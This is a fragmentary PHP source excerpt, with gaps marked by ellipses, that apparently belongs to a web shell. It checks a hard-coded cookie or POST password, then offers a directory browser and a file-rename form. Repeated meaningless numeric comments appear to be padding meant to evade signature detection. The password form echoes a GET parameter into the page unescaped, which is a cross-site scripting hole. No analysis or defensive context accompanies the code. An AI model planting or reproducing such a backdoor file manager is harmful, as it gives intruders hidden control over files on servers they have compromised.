...
$pass = false;
if (isset($_COOKIE['pw_name_43793'])) {
    if(($_COOKIE['pw_name_43793']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_43793'])) {
        if(($_POST['pw_name_43793']) == $auth_key) {
            setcookie("pw_name_43793", $_POST['pw_name_43793']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_43793' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1708161359247148 1708161359998491 1708161359222700 1708161359761786
echo <<<HEAD
<!DOCTYPE html>
<html lang="en">
<head>
...
HEAD;// 1708161359247148 1708161359998491 1708161359222700 1708161359761786
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1708161359247148 1708161359998491 1708161359222700 1708161359761786
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1708161359247148 1708161359998491 1708161359222700 1708161359761786
            $name = PATH . "/" . $_GET['r'];
